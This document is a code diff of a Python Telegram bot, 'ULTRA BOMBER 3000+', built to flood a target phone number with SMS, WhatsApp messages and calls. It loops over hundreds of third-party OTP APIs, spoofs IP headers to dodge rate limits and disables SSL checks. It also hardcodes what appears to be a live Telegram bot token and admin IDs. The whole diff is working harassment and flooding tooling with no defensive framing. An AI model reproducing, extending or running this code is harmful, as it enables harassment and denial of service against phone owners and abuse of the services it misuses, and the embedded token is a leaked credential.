@@ -1182,11 +1182,10 @@ ULTIMATE_APIS = [
 ]
 
 # Bot Configuration from .env file
-TELEGRAM_BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "")
+TELEGRAM_BOT_TOKEN = os.getenv(
+    "TELEGRAM_BOT_TOKEN", "8545605385:AAEPBwsoxJ390NEXXyK6fpjlLGL9fc2rVAM")
 CHANNEL_USERNAME = os.getenv("CHANNEL_USERNAME", "@technicalwhitehat")
-ADMIN_IDS = [
-    int(x.strip()) for x in os.getenv("ADMIN_IDS", "").split(",") if x.strip()
-]
+ADMIN_IDS = [1800946343, 5887312294]
 BOT_NAME = os.getenv("BOT_NAME", "ULTRA BOMBER 3000+")
 MAX_ATTACKS_PER_USER = 999999
 
@@ -1196,7 +1195,7 @@ if not TELEGRAM_BOT_TOKEN:
     exit(1)
 
 
-# ULTRA FAST Multi-User Optimized Phone Destroyer Class
+# ULTRA FAST Phone Destroyer Class
 class UltraPhoneDestroyer:
 
     def __init__(self, user_id, phone):
@@ -1216,47 +1215,29 @@ class UltraPhoneDestroyer:
         }
         self.last_request_count = 0
         self.last_time_check = time.time()
-        # ULTRA FAST session per user
-        self.session = None
 
-    async def create_ultra_session(self):
-        """Create ULTRA FAST session with unlimited connections"""
-        connector = aiohttp.TCPConnector(
-            limit=0,  # Unlimited total connections
-            limit_per_host=0,  # Unlimited per host
-            ssl=False,
-            use_dns_cache=True,
-            ttl_dns_cache=300,
-            keepalive_timeout=30)
-        timeout = aiohttp.ClientTimeout(total=0.3)  # Ultra fast timeout
-        self.session = aiohttp.ClientSession(
-            connector=connector,
-            timeout=timeout,
-            headers={
-                'User-Agent':
-                'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
-            })
-
-    async def ultra_bomb_api(self, api):
-        """ULTRA FAST bombing method with 0.00001 second delays"""
-        while self.running and self.session:
+    async def bomb_phone(self, session, api, phone):
+        """ULTRA FAST bombing method with 0.0001 second delays"""
+        while self.running:
             try:
                 name = api["name"]
-                url = api["url"](self.phone) if callable(
-                    api["url"]) else api["url"]
-
-                # Ultra fast dynamic headers
+                url = api["url"](phone) if callable(api["url"]) else api["url"]
                 headers = api["headers"].copy()
-                headers.update({
-                    "X-Forwarded-For":
-                    f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-                    "Client-IP": headers["X-Forwarded-For"],
-                    "X-Real-IP": headers["X-Forwarded-For"]
-                })
+
+                # Ultra fast IP rotation
+                headers[
+                    "X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
+                headers["Client-IP"] = headers["X-Forwarded-For"]
+                headers["X-Real-IP"] = headers["X-Forwarded-For"]
+                headers["User-Agent"] = random.choice([
+                    "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+                    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
+                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+                ])
 
                 self.stats["total_requests"] += 1
 
-                # Ultra fast speed calculation
+                # Calculate requests per second
                 current_time = time.time()
                 if current_time - self.last_time_check >= 1:
                     self.stats["requests_per_second"] = self.stats[
@@ -1278,13 +1259,14 @@ class UltraPhoneDestroyer:
                     self.stats["sms_sent"] += 1
                     emoji = "💬"
 
-                # ULTRA FAST requests with 0.3 second timeout
+                # ULTRA FAST requests with 0.5 second timeout
                 if api["method"] == "POST":
-                    data = api["data"](self.phone) if api["data"] else None
-                    async with self.session.post(url,
-                                                 headers=headers,
-                                                 data=data,
-                                                 ssl=False) as response:
+                    data = api["data"](phone) if api["data"] else None
+                    async with session.post(url,
+                                            headers=headers,
+                                            data=data,
+                                            timeout=0.5,
+                                            ssl=False) as response:
                         if response.status in [200, 201, 202]:
                             self.stats["successful_hits"] += 1
                             print(
@@ -1293,9 +1275,10 @@ class UltraPhoneDestroyer:
                         else:
                             self.stats["failed_attempts"] += 1
                 else:
-                    async with self.session.get(url,
-                                                headers=headers,
-                                                ssl=False) as response:
+                    async with session.get(url,
+                                           headers=headers,
+                                           timeout=0.5,
+                                           ssl=False) as response:
                         if response.status in [200, 201, 202]:
                             self.stats["successful_hits"] += 1
                             print(
@@ -1304,8 +1287,8 @@ class UltraPhoneDestroyer:
                         else:
                             self.stats["failed_attempts"] += 1
 
-                # ULTRA FAST bombing - minimal delay for maximum speed
-                await asyncio.sleep(0.00001)
+                # ULTRA FAST bombing - minimal delay
+                await asyncio.sleep(0.0001)
 
             except Exception as e:
                 self.stats["failed_attempts"] += 1
@@ -1322,19 +1305,36 @@ class UltraPhoneDestroyer:
             f"{Fore.CYAN}[User:{self.user_id}] 💣 Loading {len(ULTIMATE_APIS)} ULTRA FAST APIs...{Style.RESET_ALL}"
         )
 
-        await self.create_ultra_session()
+        # ULTRA FAST connector - unlimited connections
+        connector = aiohttp.TCPConnector(limit=0,
+                                         limit_per_host=0,
+                                         verify_ssl=False,
+                                         use_dns_cache=True)
 
-        tasks = []
-        for api in ULTIMATE_APIS:
-            task = asyncio.create_task(self.ultra_bomb_api(api))
-            tasks.append(task)
+        async with aiohttp.ClientSession(connector=connector) as session:
+            tasks = []
+            for api in ULTIMATE_APIS:
+                task = asyncio.create_task(
+                    self.bomb_phone(session, api, self.phone))
+                tasks.append(task)
 
-        await asyncio.gather(*tasks, return_exceptions=True)
+            # Auto-stop after 60 seconds
+            asyncio.create_task(self.auto_stop_after_60_seconds())
+
+            await asyncio.gather(*tasks, return_exceptions=True)
+
+    async def auto_stop_after_60_seconds(self):
+        """Auto-stop attack after 60 seconds"""
+        await asyncio.sleep(60)
+        if self.running:
+            self.running = False
+            print(
+                f"{Fore.YELLOW}[User:{self.user_id}] ⏰ Auto-stopped after 60 seconds{Style.RESET_ALL}"
+            )
+            db_manager.log_attack(self.user_id, self.phone, "Auto-stopped (60s)")
 
     def stop(self):
         self.running = False
-        if self.session:
-            asyncio.create_task(self.session.close())
 
 
 # Database Manager
@@ -1617,6 +1617,7 @@ def get_admin_keyboard():
     keyboard = [
         [KeyboardButton("💣 Start Attack"),
          KeyboardButton("🛑 Stop Attack")],
+        [KeyboardButton("🚫 All Stop Attack")],
         [
             KeyboardButton("➕ Protect Number"),
             KeyboardButton("➖ Unprotect Number")
@@ -1673,8 +1674,8 @@ Welcome Admin {user.first_name}! 👑
 📱 *800+ WhatsApp Bombing APIs*
 💬 *1700+ SMS Bombing APIs*
 
-🚀 *ULTRA FAST Mode: 0.00001s delays*
-⏱️ *0.3s timeouts for maximum speed*
+🚀 *ULTRA FAST Mode: 0.0001s delays*
+⏱️ *0.5s timeouts for maximum speed*
 
 ━━━━━━━━━━━━━━━━━━━━━
 👑 *Admin Features:*
@@ -1700,8 +1701,8 @@ Welcome {user.first_name}! 👋
 📱 *800+ WhatsApp Bombing APIs*
 💬 *1700+ SMS Bombing APIs*
 
-🚀 *ULTRA FAST Mode: 0.00001s delays*
-⏱️ *0.3s timeouts for maximum speed*
+🚀 *ULTRA FAST Mode: 0.0001s delays*
+⏱️ *0.5s timeouts for maximum speed*
 
 ━━━━━━━━━━━━━━━━━━━━━
 Use buttons below to get started!
@@ -1857,9 +1858,9 @@ async def about_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 ℹ️ *About {BOT_NAME}*
 ━━━━━━━━━━━━━━━━━━━━━
 
-🔥 *Version:* 4.0 Ultra Multi-User
+🔥 *Version:* 3.0 Ultra
 ⚡ *APIs:* {len(ULTIMATE_APIS)}+
-🚀 *Speed:* 0.00001s delays
+🚀 *Speed:* 0.0001s delays
 
 *Features:*
 📞 500+ Call APIs
@@ -2101,7 +2102,29 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     # Admin-only buttons
     if user_id in ADMIN_IDS:
-        if text == "➕ Protect Number":
+        if text == "🚫 All Stop Attack":
+            # Stop all active attacks
+            if not active_attackers:
+                await update.message.reply_text(
+                    "ℹ️ No active attacks to stop!",
+                    parse_mode='Markdown')
+                return
+            
+            stopped_count = 0
+            for uid, attacker in list(active_attackers.items()):
+                attacker.stop()
+                db_manager.log_attack(uid, attacker.phone, "Stopped by Admin")
+                stopped_count += 1
+            
+            active_attackers.clear()
+            
+            await update.message.reply_text(
+                f"✅ *All Attacks Stopped!*\n\n"
+                f"🛑 Stopped {stopped_count} active attack(s)\n"
+                f"👑 Action by Admin",
+                parse_mode='Markdown')
+            return
+        elif text == "➕ Protect Number":
             await update.message.reply_text(
                 "📲 Send the phone number to protect (10 digits):")
             context.user_data['admin_action'] = 'protect_number'
@@ -2413,18 +2436,26 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         asyncio.create_task(destroyer.start_destruction())
 
+        await asyncio.sleep(5)
+
+        stats = destroyer.stats
         status_msg = f"""
-✅ *ATTACK STARTED!*
+✅ *ATTACK IN PROGRESS!*
 ━━━━━━━━━━━━━━━━━━━━━
 
 🎯 *Target:* +91{phone}
-💣 *APIs Loaded:* {len(ULTIMATE_APIS)}
 
-⚡ Attack is running in background!
-🤖 Bot will respond to all commands!
+💣 *Requests:* {stats['total_requests']}
+✅ *Hits:* {stats['successful_hits']}
 
-📊 Use /stats to check live statistics
-🛑 Use /stop to stop the attack
+📞 *Calls:* {stats['calls_sent']}
+📱 *WhatsApp:* {stats['whatsapp_sent']}
+💬 *SMS:* {stats['sms_sent']}
+
+⚡ *Speed:* {stats['requests_per_second']} req/s
+
+Use /stop to stop the attack
+Use /stats for live statistics
 """
         await update.message.reply_text(status_msg, parse_mode='Markdown')
         return
@@ -2472,8 +2503,7 @@ def main():
     print(f"📢 Force join enabled for: {CHANNEL_USERNAME}")
     print(f"💣 Loaded {len(ULTIMATE_APIS)} ULTRA FAST APIs")
     print("👑 Admin mode activated")
-    print("⚡ ULTRA FAST Multi-User Mode: 0.00001s delays, 0.3s timeouts")
-    print("🚀 Each user gets dedicated session for maximum speed!")
+    print("⚡ ULTRA FAST Mode: 0.0001s delays, 0.5s timeouts")
 
     app.run_polling()
 
